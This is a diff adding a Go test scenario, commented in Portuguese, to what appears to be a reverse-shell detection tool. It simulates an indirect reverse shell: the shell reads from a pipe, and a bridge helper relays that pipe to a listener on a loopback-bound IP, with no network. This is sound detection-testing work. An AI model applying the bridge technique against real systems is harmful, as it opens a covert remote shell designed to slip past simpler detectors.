@@ -469,6 +469,35 @@ func init() {
 	})
 
 	Register(Scenario{
+		ID:   "R2-revshell-por-ponte",
+		Desc: "reverse shell INDIRETO: o shell lê de um pipe, a ponte segura o pipe E o socket de saída",
+		// A variante da §17 que o correlate.revshell não vê: o shell não toca a
+		// rede. Ele lê de um pipe, e um segundo processo — a ponte, o socat/python
+		// no meio — segura o outro lado do pipe e o socket que fala com o C2. É
+		// WARN, não CRITICAL: precisa de mais peças para casar e um agente de
+		// acesso remoto legítimo tem a mesma forma, então a proveniência da ponte
+		// é o que o operador usa para decidir. Provado no test/matrix; aqui ganha
+		// cenário Go — a mesma ponte, medida contra a CLI de verdade.
+		Images:    minimal,
+		Caps:      []string{"NET_ADMIN"},
+		NoNetwork: true,
+		Plant: `ip link set lo up
+			ip addr add 51.91.190.241/32 dev lo
+			/helper listen 51.91.190.241:9001 &
+			sleep 0.4
+			/helper revshell-bridge 51.91.190.241:9001 &
+			sleep 1`,
+		Expect: []Expect{
+			{ID: "correlate.revshell_bridge", Sev: "WARN", Evidence: "lê do pipe"},
+		},
+		// A forma PURA não pode disparar aqui: o shell não tem o socket nos seus
+		// próprios descritores padrão — é justamente o que torna esta variante
+		// mais fraca e a ponte necessária.
+		Forbid: []string{"correlate.revshell"},
+		Exit:   1,
+	})
+
+	Register(Scenario{
 		ID:   "41-socket-activation-nao-eh-revshell",
 		Desc: "ativação por socket tem a MESMA forma e não pode disparar",
 		// O falso positivo que a revisão de código encontrou. systemd com
